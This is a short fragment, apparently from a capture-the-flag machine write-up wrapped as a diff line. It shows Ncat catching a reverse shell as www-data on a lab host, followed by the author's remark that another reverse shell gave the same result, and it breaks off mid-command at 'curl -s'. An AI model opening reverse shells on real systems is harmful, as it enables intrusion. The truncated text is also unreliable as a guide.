@@ -1,0 +1,1 @@
+Ncat: Connection from 10.10.10.27. Ncat: Connection from 10.10.10.27:47324. bash: cannot set terminal process group (1376): Inappropriate ioctl for device bash: no job control in this shell www-data@calamity:/var/www/html$ root@kali# I tried a different reverse shell, but got the same result: root@kali# curl -s
